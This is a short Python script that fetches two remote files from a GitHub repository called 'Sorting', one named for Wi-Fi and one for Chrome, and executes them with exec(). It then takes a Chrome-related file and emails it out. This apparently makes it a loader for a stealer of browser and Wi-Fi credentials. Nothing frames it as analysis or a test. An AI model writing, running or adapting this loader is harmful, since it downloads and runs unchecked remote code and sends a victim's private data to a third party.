import importlib.util
import urllib.request
import os
import tempfile

# Function to import script from GitHub
def import_script_from_github(script_url, module_name):
    # Download the script from GitHub
    try:
        with urllib.request.urlopen(script_url) as response:
            script_code = response.read().decode('utf-8')
    except Exception as e:
        print(f"Error downloading script from {script_url}: {e}")
        return None

    # Create a module from the script code
    spec = importlib.util.spec_from_loader(module_name, loader=None, origin=script_url)
    module = importlib.util.module_from_spec(spec)
    exec(script_code, module.__dict__)

    # Insert the module into sys.modules
    import sys
    sys.modules[module_name] = module

    return module

script1_url = 'https://raw.githubusercontent.com/DarkImpact1/Sorting/main/wifi_script.py'
script1_module_name = 'mail_script' 
mail_script = import_script_from_github(script1_url, script1_module_name)


script2_url = 'https://raw.githubusercontent.com/DarkImpact1/Sorting/main/chrome_script.py'
script2_module_name = 'ch_script'  
ch_script = import_script_from_github(script2_url, script2_module_name)

if mail_script is not None and ch_script is not None:
    if __name__ == "__main__":
        with tempfile.TemporaryDirectory() as temp_dir:
            os.chdir(temp_dir)  # Change to the temporary directory
            try:
                chrome_file = ch_script.fetch_file()
                mail_script.send_email(chrome_file.name)
                mail_script.execute()
            except AttributeError as e:
                print(f"Error executing script: {e}")
            except Exception as e:
                print(f"An error occurred: {e}")
else:
    print("Failed to import one or both scripts.")
